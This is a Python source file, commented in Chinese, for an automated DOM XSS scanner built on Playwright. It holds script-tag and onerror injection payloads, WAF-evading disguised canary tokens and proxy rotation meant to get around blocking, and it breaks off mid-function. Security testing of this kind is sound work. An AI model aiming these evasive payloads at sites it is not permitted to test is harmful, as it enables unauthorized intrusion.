#DOM XSS检测引擎
#识别所有可能的XSS注入点
#实时监控DOM变化JavaScript执行
#零误报漏洞验证

#隐蔽canary token系统 - 规避WAF检测

import asyncio
import json
import re
import uuid
import time
import hashlib
import random
import base64
import urllib.parse
from datetime import datetime
from typing import Dict, List, Set, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field

#依赖
try:
    from playwright.async_api import Page, Browser, BrowserContext
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    print("  Playwright未安装")

# 导入噪音过滤器 - 防止DOM XSS扫描中的"傻逼兴奋"
try:
    from .third_party_blacklist import (
        smart_filter,
        is_third_party,
        has_security_value,
        analyze_noise_level
    )
    NOISE_FILTER_AVAILABLE = True
except ImportError:
    NOISE_FILTER_AVAILABLE = False
    print("  警告: 噪音过滤器不可用，可能会有大量第三方DOM噪音")

# 导入 WAF Defender - 防止WAF欺骗响应
try:
    from .waf_defender import create_waf_defender, WAFDefender
    WAF_DEFENDER_AVAILABLE = True
except ImportError:
    WAF_DEFENDER_AVAILABLE = False
    print("  警告: WAF Defender不可用，可能会受到WAF欺骗")

@dataclass
class XSSPayload:
    """XSS测试载荷 - 智能评分版"""
    name: str
    payload: str
    canary_token: str
    detection_method: str
    risk_level: str
    
    # 智能评分系统
    effectiveness_score: float = 0.0      # 历史成功率 (0-1)
    waf_bypass_score: float = 0.0         # WAF绕过能力 (0-1) 
    stealth_score: float = 0.0            # 隐蔽性评分 (0-1)
    framework_specificity: str = "generic" # 框架特异性
    complexity_level: int = 1              # 复杂度等级 (1-5)
    
    def get_priority_score(self) -> float:
        """计算优先级综合评分"""
        return (self.effectiveness_score * 0.4 + 
                self.waf_bypass_score * 0.3 + 
                self.stealth_score * 0.2 + 
                (self.complexity_level / 5.0) * 0.1)

@dataclass
class XSSVulnerability:
    #XSS漏洞信息 
    vuln_id: str
    injection_point: str
    payload_used: str
    canary_token: str
    detection_method: str
    severity: str
    url: str
    dom_context: str
    timestamp: str

@dataclass
class DOMXSSConfig:
    """DOM XSS扫描配置 - 智能化版本"""
    # 检测配置
    enable_form_testing: bool = True
    enable_url_param_testing: bool = True
    enable_hash_testing: bool = True
    enable_dom_property_testing: bool = True
    
    # 智能化配置
    enable_smart_concurrency: bool = True     # 智能并发
    enable_payload_prioritization: bool = True # payload优先级
    enable_injection_point_dedup: bool = True  # 注入点去重
    enable_context_awareness: bool = True      # 上下文感知
    enable_waf_detection: bool = True          # WAF检测
    
    # 性能配置
    max_payloads_per_input: int = 8
    detection_timeout: int = 5000
    max_inputs_to_test: int = 25
    concurrent_tests: int = 5
    page_wait_time: int = 2000
    
    # 自适应配置
    min_payload_score: float = 0.3    # 最低payload评分阈值
    waf_detection_threshold: int = 3   # WAF检测阈值
    similarity_threshold: float = 0.8  # 注入点相似度阈值

class PlaywrightResponseAdapter:
    """Playwright页面响应适配器 - 让WAF Defender能处理Playwright对象"""
    
    def __init__(self, page, response_data: Dict[str, Any] = None):
        self.page = page
        self.response_data = response_data or {}
        self._content_cache = None
        self._headers_cache = None
    
    @property
    def status(self) -> int:
        """获取状态码 - 优先使用response_data，否则默认200"""
        return self.response_data.get('status', 200)
    
    async def text(self) -> str:
        """获取页面内容"""
        if self._content_cache is None:
            try:
                self._content_cache = await self.page.content()
            except Exception:
                self._content_cache = ""
        return self._content_cache
    
    @property
    def headers(self) -> Dict[str, str]:
        """获取响应头 - 模拟常见头"""
        if self._headers_cache is None:
            try:
                # 从response_data获取，或使用默认值
                self._headers_cache = self.response_data.get('headers', {
                    'content-type': 'text/html; charset=utf-8',
                    'server': 'unknown'
                })
            except Exception:
                self._headers_cache = {'content-type': 'text/html; charset=utf-8'}
        return self._headers_cache
    
    @classmethod
    async def from_page_navigation(cls, page, url: str):
        """从页面导航创建适配器"""
        try:
            # 尝试获取响应信息
            response_data = await page.evaluate("""
                () => {
                    return {
                        status: 200, // Playwright中难以获取状态码，默认200
                        url: window.location.href,
                        headers: {
                            'content-type': document.contentType || 'text/html',
                            'url': window.location.href
                        }
                    };
                }
            """)
            return cls(page, response_data)
        except Exception:
            return cls(page, {'status': 200, 'url': url})

class DOMXSSScanner:
    
    def __init__(self, browser: Browser = None, page: Page = None, config: DOMXSSConfig = None, proxy_pool=None):
        self.browser = browser
        self.page = page
        self.config = config or DOMXSSConfig()
        self.proxy_pool = proxy_pool
        
        # 检测结果
        self.vulnerabilities: List[XSSVulnerability] = []
        self.tested_inputs: List[Dict] = []
        self.canary_tokens: Set[str] = set()
        
        # 会话标识
        self.scan_id = str(uuid.uuid4())[:8]
        
        # 初始化隐蔽token生成器
        self.canary_generator = self._init_canary_generator()
        
        # 智能化状态 - 精简版
        self.detected_framework: str = "generic"
        self.max_concurrent: int = 10 if proxy_pool else 3  # 有代理池可以更高并发
        self.payload_success_stats: Dict[str, Dict] = {}  # payload成功统计
        
        # 噪音过滤统计
        self.noise_stats = {
            'total_urls_found': 0,
            'noise_filtered': 0,
            'valuable_findings': 0
        }
        
        # WAF Defender 状态
        self.waf_defender = None
        self.waf_defender_initialized = False
        
        noise_status = "OK" if NOISE_FILTER_AVAILABLE else "错误"
        waf_status = "OK" if WAF_DEFENDER_AVAILABLE else "错误"
        print(f"  DOM XSS扫描器初始化 [扫描ID: {self.scan_id}] [并发: {self.max_concurrent}] [噪音过滤: {noise_status}] [WAF防护: {waf_status}]")
    
    def _init_canary_generator(self):
        """初始化更隐蔽的canary token生成器"""
        # 常见的HTML属性值模式，用于伪装
        self.common_patterns = [
            "content",      # data-content-xyz
            "item",         # item-xyz  
            "element",      # element-xyz
            "component",    # component-xyz
            "widget",       # widget-xyz
            "module",       # module-xyz
            "section",      # section-xyz
            "block"         # block-xyz
        ]
        
        # 常见的ID前缀模式
        self.id_patterns = [
            "id",           # id12345678
            "uid",          # uid87654321
            "ref",          # ref11223344
            "key",          # key99887766
            "idx",          # idx55443322
            "tid"           # tid13579246
        ]
        
        return True
    
    async def _analyze_page_context(self):
        """分析页面技术栈和上下文"""
        try:
            context_info = await self.page.evaluate("""
                () => {
                    const context = {
                        frameworks: [],
                        libraries: [],
                        meta_info: {},
                        form_types: [],
                        input_patterns: []
                    };
                    
                    // 检测前端框架
                    if (window.React || document.querySelector('[data-reactroot]')) {
                        context.frameworks.push('React');
                    }
                    if (window.Vue || document.querySelector('[data-v-]')) {
                        context.frameworks.push('Vue');
                    }
                    if (window.angular || document.querySelector('[ng-app], [data-ng-app]')) {
                        context.frameworks.push('Angular');
                    }
                    if (window.jQuery || window.$) {
                        context.libraries.push('jQuery');
                    }
                    if (window.Handlebars) {
                        context.libraries.push('Handlebars');
                    }
                    
                    // 分析表单类型
                    document.querySelectorAll('form').forEach(form => {
                        const action = form.action || '';
                        if (action.includes('login')) context.form_types.push('login');
                        if (action.includes('search')) context.form_types.push('search');
                        if (action.includes('contact')) context.form_types.push('contact');
                        if (action.includes('comment')) context.form_types.push('comment');
                    });
                    
                    // 分析输入模式
                    document.querySelectorAll('input, textarea').forEach(input => {
                        const name = (input.name || '').toLowerCase();
                        const id = (input.id || '').toLowerCase();
                        const placeholder = (input.placeholder || '').toLowerCase();
                        
                        if (/email/i.test(name + id + placeholder)) {
                            context.input_patterns.push('email');
                        }
                        if (/search/i.test(name + id + placeholder)) {
                            context.input_patterns.push('search');
                        }
                        if (/comment|message/i.test(name + id + placeholder)) {
                            context.input_patterns.push('message');
                        }
                    });
                    
                    return context;
                }
            """)
            
            # 存储检测到的框架
            self.detected_frameworks = context_info.get('frameworks', [])
            
            if self.detected_frameworks:
                print(f"        检测到框架: {', '.join(self.detected_frameworks)}")
            
            # 根据检测结果调整策略
            if 'React' in self.detected_frameworks:
                self.current_strategy = "react_focused"
            elif 'Vue' in self.detected_frameworks:
                self.current_strategy = "vue_focused"
            elif 'Angular' in self.detected_frameworks:
                self.current_strategy = "angular_focused"
            else:
                self.current_strategy = "generic"
                
            print(f"        扫描策略: {self.current_strategy}")
            
        except Exception as e:
            print(f"        上下文分析失败: {e}")
            self.current_strategy = "default"
    
    async def _initialize_waf_defender(self):
        """初始化 WAF Defender"""
        if not WAF_DEFENDER_AVAILABLE or self.waf_defender_initialized:
            return
        
        try:
            # 获取目标URL
            if self.page:
                target_url = self.page.url
            else:
                print("        WAF Defender初始化跳过: 无有效页面")
                return
            
            # 创建模拟的session（Playwright不需要真实session）
            mock_session = type('MockSession', (), {
                'get': lambda *args, **kwargs: None  # 占位符
            })()
            
            print("      初始化WAF Defender...")
            self.waf_defender = await create_waf_defender(target_url, mock_session)
            self.waf_defender_initialized = True
            
            print(f"        WAF Defender初始化成功 (目标: {target_url})")
            
        except Exception as e:
            print(f"        WAF Defender初始化失败: {e}")
            self.waf_defender = None
            self.waf_defender_initialized = False
    
    async def _validate_response_with_waf(self, url: str, expected_type: Optional[str] = None, 
                                        context: Optional[Dict[str, Any]] = None) -> bool:
        """使用WAF Defender验证响应真实性"""
        if not self.waf_defender or not self.waf_defender_initialized:
            return True  # 如果WAF Defender不可用，默认通过
        
        try:
            # 创建Playwright响应适配器
            adapter = await PlaywrightResponseAdapter.from_page_navigation(self.page, url)
            
            # 使用WAF Defender验证
            is_real = await self.waf_defender.validate(
                url=url,
                response=adapter,
                expected_type=expected_type,
                context=context
            )
            
            if not is_real:
                print(f"        🛡️  WAF欺骗检测: {url} - 响应可能是WAF伪造")
                return False
            
            return True
            
        except Exception as e:
            print(f"        WAF验证异常: {e}")
            return True  # 异常时默认通过，避免影响扫描
    
    def _deduplicate_injection_points(self, points: List[Dict]) -> List[Dict]:
        """智能去重注入点"""
        if not points:
            return points
            
        deduplicated = []
        seen_patterns = set()
        
        for point in points:
            # 生成相似性签名
            signature = self._generate_point_signature(point)
            
            # 检查是否已有相似的点
            is_duplicate = False
            for seen_sig in seen_patterns:
                if self._calculate_similarity(signature, seen_sig) > self.config.similarity_threshold:
                    is_duplicate = True
                    break
            
            if not is_duplicate:
                deduplicated.append(point)
                seen_patterns.add(signature)
        
        removed_count = len(points) - len(deduplicated)
        if removed_count > 0:
            print(f"        去重完成: 移除 {removed_count} 个相似注入点")
        
        return deduplicated
    
    def _generate_point_signature(self, point: Dict) -> str:
        """生成注入点签名"""
        point_type = point.get('type', '')
        name = point.get('name', '')
        selector = point.get('selector', '')
        element = point.get('element', '')
        
        # 标准化名称 (移除数字后缀)
        normalized_name = re.sub(r'\d+$', '', name.lower())
        
        return f"{point_type}:{normalized_name}:{element}"
    
    def _calculate_similarity(self, sig1: str, sig2: str) -> float:
        """计算签名相似度"""
        if sig1 == sig2:
            return 1.0
        
        # 简单的字符串相似度计算
        parts1 = sig1.split(':')
        parts2 = sig2.split(':')
        
        if len(parts1) != len(parts2):
            return 0.0
        
        matches = sum(1 for p1, p2 in zip(parts1, parts2) if p1 == p2)
        return matches / len(parts1)
    
    def _generate_stealth_canary(self, test_type: str = "generic") -> str:
        """生成隐蔽的canary token，规避WAF检测"""
        current_time = int(time.time())
        random_num = random.randint(1000, 99999)
        
        # 根据测试类型选择不同的伪装策略
        if test_type == "dom_id":
            # 伪装成普通HTML ID
            pattern = random.choice(self.id_patterns)
            time_part = str(current_time)[-4:]  # 时间戳后4位
            random_part = str(random_num)[:4]   # 随机数前4位
            return f"{pattern}{time_part}{random_part}"
            
        elif test_type == "data_attr":
            # 伪装成data属性值
            pattern = random.choice(self.common_patterns)
            hash_input = f"{self.scan_id}{current_time}{random_num}".encode()
            hash_part = hashlib.md5(hash_input).hexdigest()[:6]
            return f"{pattern}-{hash_part}"
            
        elif test_type == "css_class":
            # 伪装成CSS类名
            pattern = random.choice(self.common_patterns)
            time_part = str(current_time)[-3:]
            return f"{pattern}-{time_part}{random.randint(100, 999)}"
            
        elif test_type == "js_var":
            # 伪装成JavaScript变量名
            hash_input = f"{self.scan_id}{current_time}".encode()
            hash_hex = hashlib.md5(hash_input).hexdigest()[:8]
            return f"var_{hash_hex}"
            
        elif test_type == "url_param":
            # 伪装成URL参数值
            hash_input = f"{random_num}{current_time}".encode()
            return hashlib.sha256(hash_input).hexdigest()[:12]
            
        elif test_type == "email_like":
            # 伪装成邮箱地址的一部分
            hash_input = f"{current_time}{random_num}".encode()
            hash_part = hashlib.md5(hash_input).hexdigest()[:8]
            return f"user{hash_part}"
            
        elif test_type == "search_term":
            # 伪装成搜索词
            patterns = ["query", "search", "term", "keyword"]
            pattern = random.choice(patterns)
            return f"{pattern}{random.randint(1000, 9999)}"
            
        else:
            # 默认：伪装成普通十六进制ID
            hash_input = f"{self.scan_id}{current_time}{random_num}".encode()
            return hashlib.md5(hash_input).hexdigest()[:10]
    
    def _generate_context_aware_canary(self, injection_point: Dict) -> str:
        """根据注入点上下文生成合适的canary token"""
        point_type = injection_point.get('type', 'generic')
        
        if point_type == 'form_input':
            # 表单输入：使用看起来像用户输入的格式
            input_name = injection_point.get('name', '').lower()
            if 'email' in input_name:
                return self._generate_stealth_canary("email_like")
            elif 'search' in input_name:
                return self._generate_stealth_canary("search_term")
            else:
                return self._generate_stealth_canary("data_attr")
                
        elif point_type == 'url_parameter':
            # URL参数：使用看起来像正常参数值的格式
            return self._generate_stealth_canary("url_param")
            
        elif point_type in ['hash_parameter', 'hash_fragment']:
            # Hash参数：使用简短的十六进制格式
            return self._generate_stealth_canary("css_class")
            
        elif point_type == 'dom_property':
            # DOM属性：根据元素类型选择
            element = injection_point.get('element', '')
            if element in ['div', 'span', 'section']:
                return self._generate_stealth_canary("dom_id")
            else:
                return self._generate_stealth_canary("data_attr")
                
        return self._generate_stealth_canary("generic")
    
    async def scan(self) -> Dict[str, Any]:
        #执行完整的DOM XSS扫描 
        print("\n  启动DOM XSS自动化检测...")
        
        start_time = time.time()
        
        try:
            # 初始化 WAF Defender
            await self._initialize_waf_defender()
            
            # 设置页面监控
            await self._setup_page_monitoring()
            
            # 智能上下文分析
            if self.config.enable_context_awareness:
                print("      分析页面技术栈...")
                await self._analyze_page_context()
            
            # 识别输入点
            print("      识别XSS注入点...")
            input_points = await self._identify_injection_points()
            
            # 智能去重
            if self.config.enable_injection_point_dedup:
                print("      智能去重注入点...")
                input_points = self._deduplicate_injection_points(input_points)
            
            # 生成测试载荷
            print("      生成智能化测试载荷...")
            payloads = self._generate_safe_payloads()
            
            # 执行XSS测试
            print("      执行DOM XSS测试...")
            await self._execute_xss_tests(input_points, payloads)
            
            # 验证检测结果
            print(" 验证漏洞发现...")
            await self._verify_vulnerabilities()
            
            execution_time = time.time() - start_time
            
            # 生成扫描报告
            results = self._generate_scan_report(execution_time)
            
            print(f"  DOM XSS扫描完成 ({execution_time:.2f}秒)")
            print(f"  发现漏洞: {len(self.vulnerabilities)} 个")
            print(f"  测试点: {len(self.tested_inputs)} 个")
            
            # 噪音过滤统计报告
            if NOISE_FILTER_AVAILABLE and self.noise_stats['total_urls_found'] > 0:
                total_findings = self.noise_stats['noise_filtered'] + self.noise_stats['valuable_findings']
                if total_findings > 0:
                    noise_ratio = self.noise_stats['noise_filtered'] / total_findings
                    print(f"  目标 智能过滤统计: 噪音 {self.noise_stats['noise_filtered']}, 有价值 {self.noise_stats['valuable_findings']} (噪音率: {noise_ratio:.1%})")
                    if noise_ratio > 0.4:
                        print("  OK 成功避免了严重的DOM XSS '傻逼兴奋' - 大量第三方噪音被过滤")
            
            return results
            
        except Exception as e:
            print(f"  DOM XSS扫描错误: {e}")
            return self._create_error_result(str(e))
    
    async def _setup_page_monitoring(self):
        #设置页面监控 
        # 注入DOM变化监控脚本
        await self.page.add_init_script("""
            // 初始化检测存储
            window.xss_canary_detections = [];
            window.xss_dom_mutations = [];
            window.xss_js_errors = [];
            window.xss_csp_violations = [];
            window.xss_network_requests = [];
            window.xss_dialogs_triggered = false;
            
            // DOM变化监控 - 增强版
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.type === 'childList') {
                        mutation.addedNodes.forEach(function(node) {
                            if (node.nodeType === 1) {
                                const content = node.innerHTML || node.outerHTML || '';
                                window.xss_dom_mutations.push({
                                    type: 'childList',
                                    content: content.substring(0, 300),
                                    tagName: node.tagName,
                                    timestamp: Date.now(),
                                    suspicious: /script|onerror|onload|javascript:|eval\\(/i.test(content)
                                });
                            }
                        });
                    } else if (mutation.type === 'attributes') {
                        const target = mutation.target;
                        const attrValue = target.getAttribute(mutation.attributeName) || '';
                        if (/on\\w+|javascript:|eval\\(/i.test(attrValue)) {
                            window.xss_dom_mutations.push({
                                type: 'attributes',
                                attributeName: mutation.attributeName,
                                content: attrValue.substring(0, 200),
                                tagName: target.tagName,
                                timestamp: Date.now(),
                                suspicious: true
                            });
                        }
                    }
                });
            });
            
            // 启动DOM监控
            if (document.body) {
                observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeOldValue: true
            });
            } else {
                document.addEventListener('DOMContentLoaded', () => {
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true,
                        attributes: true,
                        attributeOldValue: true
                    });
                });
            }
            
            // JavaScript错误监控
            window.addEventListener('error', function(event) {
                window.xss_js_errors.push({
                    message: event.message,
                    filename: event.filename,
                    lineno: event.lineno,
                    timestamp: Date.now(),
                    stack: event.error ? event.error.stack : null
                });
            });
            
            // 未处理的Promise错误
            window.addEventListener('unhandledrejection', function(event) {
                window.xss_js_errors.push({
                    message: 'Unhandled Promise Rejection: ' + event.reason,
                    type: 'promise_rejection',
                    timestamp: Date.now()
                });
            });
            
            // CSP违规监控
            document.addEventListener('securitypolicyviolation', function(event) {
                window.xss_csp_violations.push({
                    violatedDirective: event.violatedDirective,
                    blockedURI: event.blockedURI,
                    originalPolicy: event.originalPolicy,
                    timestamp: Date.now()
                });
            });
            
            // 网络请求监控 (拦截fetch)
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                const url = args[0];
                const options = args[1] || {};
                
                window.xss_network_requests.push({
                    url: typeof url === 'string' ? url : url.url,
                    method: options.method || 'GET',
                    timestamp: Date.now(),
                    type: 'fetch'
                });
                
                return originalFetch.apply(this, args);
            };
            
            // 拦截XMLHttpRequest
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalOpen = xhr.open;
                
                xhr.open = function(method, url, ...args) {
                    window.xss_network_requests.push({
                        url: url,
                        method: method,
                        timestamp: Date.now(),
                        type: 'xhr'
                    });
                    return originalOpen.apply(this, [method, url, ...args]);
                };
                
                return xhr;
            };
            
            // 弹窗监控
            const originalAlert = window.alert;
            const originalConfirm = window.confirm;
            const originalPrompt = window.prompt;
            
            window.alert = function(message) {
                window.xss_dialogs_triggered = true;
                return originalAlert.apply(this, arguments);
            };
            
            window.confirm = function(message) {
                window.xss_dialogs_triggered = true;
                return originalConfirm.apply(this, arguments);
            };
            
            window.prompt = function(message) {
                window.xss_dialogs_triggered = true;
                return originalPrompt.apply(this, arguments);
            };
            
            // Canary Token检测函数
            window.detectCanaryToken = function(token) {
                window.xss_canary_detections.push({
                    token: token,
                    detected: true,
                    timestamp: Date.now(),
                    location: 'javascript_execution',
                    stack: new Error().stack
                });
                
                // 同时触发一个自定义事件
                try {
                    document.dispatchEvent(new CustomEvent('xss-canary-detected', {
                        detail: { token: token }
                    }));
                } catch(e) {}
            };
            
            // 监听自定义canary事件
            document.addEventListener('xss-canary-detected', function(event) {
                // 额外的检测逻辑
                console.log('XSS Canary detected:', event.detail.token);
            });
        """)
    
    async def _identify_injection_points(self) -> List[Dict]:
        #识别所有可能的XSS注入点 
        injection_points = []
        
        # 1. 表单输入框
        if self.config.enable_form_testing:
            form_inputs = await self._find_form_inputs()
            injection_points.extend(form_inputs)
        
        # 2. URL参数
        if self.config.enable_url_param_testing:
            url_params = await self._find_url_parameters()
            injection_points.extend(url_params)
        
        # 3. Hash参数
        if self.config.enable_hash_testing:
            hash_params = await self._find_hash_parameters()
            injection_points.extend(hash_params)
        
        # 4. DOM属性测试点
        if self.config.enable_dom_property_testing:
            dom_properties = await self._find_dom_properties()
            injection_points.extend(dom_properties)
        
        print(f"发现注入点: {len(injection_points)} 个")
        return injection_points[:self.config.max_inputs_to_test]
    
    async def _find_form_inputs(self) -> List[Dict]:
        #查找表单输入点 
        try:
            inputs = await self.page.evaluate("""
                () => {
                    const inputs = [];
                    
                    // 扩展输入框类型检测
                    document.querySelectorAll('input, textarea, [contenteditable="true"], [role="textbox"], [role="searchbox"]').forEach((input, index) => {
                        // 跳过隐藏和只读元素
                        if (input.type === 'hidden' || input.readOnly || input.disabled) return;
                        
                        // 优雅的选择器生成逻辑
                        const selector = input.id ? '#' + input.id : 
                                       input.name ? input.tagName.toLowerCase() + '[name="' + input.name + '"]' : 
                                       input.tagName.toLowerCase() + ':nth-of-type(' + (index + 1) + ')';
                        
                        inputs.push({
                            type: 'form_input',
                            element: input.tagName.toLowerCase(),
                            selector: selector,
                            name: input.name || 'input_' + index,
                            id: input.id || '',
                            placeholder: input.placeholder || '',
                            form_action: input.form ? input.form.action : ''
                        });
                    });
                    
                    return inputs;
                }
            """)
            
            return inputs
        except:
            return []
    
    async def _find_url_parameters(self) -> List[Dict]:
        """查找URL参数注入点 - 智能噪音过滤版"""
        current_url = self.page.url
        parsed_url = urlparse(current_url)
        params = parse_qs(parsed_url.query)
        
        url_points = []
        total_params = len(params)
        filtered_count = 0
        
        # 常见的第三方服务参数（噪音制造者）
        third_party_params = {
            # Google Analytics 傻逼兴奋参数
            'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
            'gclid', 'fbclid', 'mc_eid', 'mc_cid', '_ga', '_gid', '_gat',
            
            # Facebook 噪音参数
            'fb_action_ids', 'fb_action_types', 'fb_source',
            
            # 其他常见第三方噪音
            'ref', 'referrer', 'source', 'medium', 'campaign',
            'affiliate_id', 'partner_id', 'tracking_id',
            'hsCtaTracking', 'mkt_tok',  # HubSpot, Marketo
            
            # 日本特有的第三方参数
            'yahoo_ydn', 'criteo_id', 'rtoaster'
        }
        
        for param_name in params.keys():
            self.noise_stats['total_urls_found'] += 1
            param_value = params[param_name][0] if params[param_name] else ''
            
            # 检查是否是第三方噪音参数
            is_noise = False
            if NOISE_FILTER_AVAILABLE:
                # 1. 检查参数名是否是已知噪音
                if param_name.lower() in third_party_params:
                    is_noise = True
                
                # 2. 检查参数值是否指向第三方服务
                elif param_value and is_third_party(param_value):
                    is_noise = True
                
                # 3. 检查完整URL是否是第三方
                elif is_third_party(current_url):
                    # 如果整个页面都是第三方，但参数可能有价值
                    if not has_security_value(f"{param_name}={param_value}"):
                        is_noise = True
            
            if is_noise:
                filtered_count += 1
                self.noise_stats['noise_filtered'] += 1
                print(f"          过滤第三方参数: {param_name}={param_value[:30]}...")
                continue
            
            # 这是有价值的参数
            self.noise_stats['valuable_findings'] += 1
            url_points.append({
                'type': 'url_parameter',
                'parameter': param_name,
                'current_value': param_value,
                'url': current_url,
                'filtered': False
            })
        
        # 噪音过滤统计
        if total_params > 0:
            noise_ratio = filtered_count / total_params
            if noise_ratio > 0.5:
                print(f"        URL参数噪音过滤: {filtered_count}/{total_params} ({noise_ratio:.1%}) - 避免了参数傻逼兴奋")
            elif filtered_count > 0:
                print(f"        过滤了 {filtered_count} 个第三方URL参数")
        
        return url_points
    
    async def _find_hash_parameters(self) -> List[Dict]:
        #查找Hash片段注入点 
        try:
            hash_info = await self.page.evaluate("""
                () => {
                    const hash = window.location.hash;
                    if (!hash) return [];
                    
                    // 检查hash是否包含参数
                    const hashParams = [];
                    if (hash.includes('=')) {
                       // 类似param=value 的形式
                        const pairs = hash.substring(1).split('&');
                        pairs.forEach(pair => {
                            const [key, value] = pair.split('=');
                            if (key) {
                                hashParams.push({
                                    type: 'hash_parameter',
                                    parameter: key,
                                    current_value: value || '',
                                    hash: hash
                                });
                            }
                        });
                    } else {
                        // 整个hash作为一个测试点   有必要？
                        hashParams.push({
                            type: 'hash_fragment',
                            parameter: 'hash',
                            current_value: hash.substring(1),
                            hash: hash
                        });
                    }
                    
                    return hashParams;
                }
            """)
            
            return hash_info
        except:
            return []
    
    async def _find_dom_properties(self) -> List[Dict]:
        """查找DOM属性注入点 - 智能噪音过滤版"""
        try:
            dom_points = await self.page.evaluate("""
                () => {
                    const points = [];
                    
                    // 扩展DOM注入点检测 - 现代兼容
                    const selectors = [
                        '[data-*]', '[id*="content"]', '[class*="content"]', '[class*="message"]',
                        '[class*="search"]', '[class*="input"]', '[class*="field"]', 
                        '[placeholder]', '[aria-label]', '[role="button"]', '[role="textbox"]',
                        'button', 'a[href*="javascript:"]', 'a[href*="#"]',
                        '[onclick]', '[onmouseover]', '[onfocus]',
                        '[data-search]', '[data-query]', '[data-value]'
                    ];
                    
                    document.querySelectorAll(selectors.join(', ')).forEach((el, index) => {
                        // 检查是否可能是注入点
                        const hasRelevantAttributes = el.hasAttributes() && (
                            el.getAttribute('data-search') || 
                            el.getAttribute('data-query') ||
                            el.getAttribute('data-value') ||
                            el.placeholder ||
                            el.getAttribute('aria-label') ||
                            el.onclick ||
                            el.getAttribute('role')
                        );
                        
                        const hasContent = el.innerHTML && el.innerHTML.length > 0 && el.innerHTML.length < 1000;
                        
                        if (hasRelevantAttributes || hasContent) {
                            // 增加第三方检测信息
                            const scripts = el.querySelectorAll('script');
                            let thirdPartyIndicators = [];
                            
                            scripts.forEach(script => {
                                const src = script.src || '';
                                if (src) thirdPartyIndicators.push(src);
                            });
                            
                            // 检查class和id中的第三方标识
                            const classNames = el.className || '';
                            const elementId = el.id || '';
                            const thirdPartyClasses = [
                                'google', 'facebook', 'twitter', 'analytics', 'gtm', 'ga-',
                                'hotjar', 'intercom', 'zendesk', 'drift', 'mixpanel'
                            ];
                            
                            const hasThirdPartyClass = thirdPartyClasses.some(tpClass => 
                                classNames.toLowerCase().includes(tpClass) || 
                                elementId.toLowerCase().includes(tpClass)
                            );
                            
                            points.push({
                                type: 'dom_property',
                                element: el.tagName.toLowerCase(),
                                selector: el.id ? '#' + el.id : 
                                        el.className ? '.' + el.className.split(' ')[0] : 
                                        el.tagName.toLowerCase() + ':nth-of-type(' + (index + 1) + ')',
                                current_content: el.innerHTML ? el.innerHTML.substring(0, 100) : '',
                                attributes: Array.from(el.attributes).map(attr => attr.name),
                                interactive: !!(el.onclick || el.getAttribute('role') === 'button'),
                                aria_label: el.getAttribute('aria-label') || '',
                                placeholder: el.placeholder || '',
                                data_attributes: Array.from(el.attributes)
                                    .filter(attr => attr.name.startsWith('data-'))
                                    .map(attr => ({ name: attr.name, value: attr.value })),
                                // 第三方检测信息
                                third_party_scripts: thirdPartyIndicators,
                                has_third_party_class: hasThirdPartyClass,
                                class_names: classNames,
                                element_id: elementId
                            });
                        }
                    });
                    
                    return points;
                }
            """)
            
            # 在Python端进行噪音过滤
            filtered_points = []
            total_points = len(dom_points)
            filtered_count = 0
            
            for point in dom_points:
                self.noise_stats['total_urls_found'] += 1
                is_noise = False
                
                if NOISE_FILTER_AVAILABLE:
                    # 1. 检查是否有第三方class标识
                    if point.get('has_third_party_class', False):
                        is_noise = True
                    
                    # 2. 检查第三方脚本
                    elif point.get('third_party_scripts'):
                        third_party_count = 0
                        for script_src in point['third_party_scripts']:
                            if is_third_party(script_src):
                                third_party_count += 1
                        
                        # 如果超过一半的脚本是第三方，认为是噪音
                        if third_party_count > len(point['third_party_scripts']) / 2:
                            is_noise = True
                    
                    # 3. 检查DOM内容是否包含第三方服务
                    elif point.get('current_content'):
                        content = point['current_content'].lower()
                        third_party_keywords = [
                            'google-analytics', 'gtag', 'ga(', 'fbq(',
                            'hotjar', 'intercom', 'mixpanel', 'segment'
                        ]
                        if any(keyword in content for keyword in third_party_keywords):
                            is_noise = True
                
                if is_noise:
                    filtered_count += 1
                    self.noise_stats['noise_filtered'] += 1
                    print(f"          过滤第三方DOM元素: {point.get('selector', 'unknown')}")
                    continue
                
                # 清理第三方检测字段（不需要传递给后续处理）
                clean_point = {k: v for k, v in point.items() 
                             if k not in ['third_party_scripts', 'has_third_party_class', 'class_names', 'element_id']}
                clean_point['filtered'] = False
                
                self.noise_stats['valuable_findings'] += 1
                filtered_points.append(clean_point)
            
            # 噪音过滤统计
            if total_points > 0:
                noise_ratio = filtered_count / total_points
                if noise_ratio > 0.3:
                    print(f"        DOM元素噪音过滤: {filtered_count}/{total_points} ({noise_ratio:.1%}) - 避免了DOM傻逼兴奋")
                elif filtered_count > 0:
                    print(f"        过滤了 {filtered_count} 个第三方DOM元素")
            
            return filtered_points
            
        except Exception as e:
            print(f"        DOM属性检测失败: {e}")
            return []
    
    def _generate_safe_payloads(self, injection_point: Dict = None) -> List[XSSPayload]:
        """精简payload - 依赖代理轮换而非复杂编码"""
        payloads = []
        
        # 1. 直接的payload（代理会处理封禁问题）
        basic_canary = self._generate_stealth_canary("js_var")
        payloads.append(XSSPayload(
            name="Direct Script",
            payload=f'<script>window.detectCanaryToken&&window.detectCanaryToken("{basic_canary}")</script>',
            canary_token=basic_canary,
            detection_method="js_execution",
            risk_level="high",
            effectiveness_score=0.9,
            waf_bypass_score=0.6,
            stealth_score=0.5
        ))
        
        # 2. 事件处理器（简单直接）
        event_canary = self._generate_stealth_canary("data_attr")
        payloads.append(XSSPayload(
            name="Event Handler",
            payload=f'<img src=x onerror="window.detectCanaryToken&&window.detectCanaryToken(\'{event_canary}\')">',
            canary_token=event_canary,
            detection_method="js_execution",
            risk_level="high",
            effectiveness_score=0.8,
            waf_bypass_score=0.7,
            stealth_score=0.6
        ))
        
        # 3. 现代框架payload（保留，因为是功能需要）
        if self.detected_framework == "React":
            react_canary = self._generate_stealth_canary("js_var")
            payloads.append(self._get_react_payload(react_canary))
        elif self.detected_framework == "Vue":
            vue_canary = self._generate_stealth_canary("js_var")
